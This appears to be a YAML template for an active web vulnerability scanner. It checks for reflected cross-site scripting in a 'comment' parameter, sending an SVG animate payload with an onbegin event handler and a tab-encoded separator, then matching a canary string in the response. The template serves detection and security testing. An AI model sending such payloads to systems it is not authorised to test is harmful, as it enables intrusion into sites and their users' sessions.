id: xss5-2807
name: 'Raw XSS5 in comment'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in comment'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      comment:
        - '<svg><animate%09onbegin=nx52806 attributeName=x>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx52806'
